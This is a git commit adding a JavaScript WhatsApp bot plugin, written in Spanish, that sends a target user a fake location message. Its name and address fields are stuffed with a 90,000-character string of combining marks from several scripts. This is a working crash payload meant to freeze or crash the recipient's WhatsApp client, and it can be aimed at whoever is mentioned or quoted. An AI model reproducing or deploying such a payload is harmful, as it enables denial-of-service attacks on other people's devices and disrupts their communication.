cc0154f52cdc51533a4894035491b86d2707c20a
Tobiprueba <virtualvirtuales538@gmail.com>
2025-07-08 00:53:23 -0600

    Add files via upload

---
+++ plugins/tools-pruebaios2.js
@@ -0,0 +1,41 @@
+let handler = async (m, { conn }) => {
+  const jid = m.quoted?.sender || m.mentionedJid?.[0] || m.chat
+  if (jid === conn.user.id) {
+    return conn.sendMessage(m.chat, { text: '❌ No puedo enviármelo a mí mismo.' }, { quoted: m })
+  }
+
+  const objetivo = jid
+
+  const caracter = 'ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵'
+  const repeticiones = 266
+  const caracteresPorRepeticion = caracter.length
+  const totalBase = repeticiones * caracteresPorRepeticion
+  const faltan = 90000 - totalBase
+
+  const textoLargo = caracter.repeat(repeticiones) + caracter.slice(0, faltan)
+
+  const fakeLoc = {
+    key: {
+      fromMe: false,
+      participant: "0@s.whatsapp.net",
+      ...(m.chat ? { remoteJid: "status@broadcast" } : {})
+    },
+    message: {
+      locationMessage: {
+        name: 'C•137DOMINAᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵', // Esto se muestra arriba
+        degreesLatitude: 19.432608,   // Coordenadas de CDMX por ejemplo (válidas para simular Google)
+        degreesLongitude: -99.133209,
+        address: textoLargo, // 90,000 caracteres
+        jpegThumbnail: Buffer.alloc(1), // necesario para que WhatsApp lo vea como "mapa"
+        isLive: false
+      }
+    }
+  }
+
+  await conn.relayMessage(objetivo, fakeLoc.message, { messageId: conn.generateMessageTag() })
+}
+
+handler.command = /^puta|ubicaciongoogle|fakelocgoogle$/i
+handler.owner = true
+
+export default handler
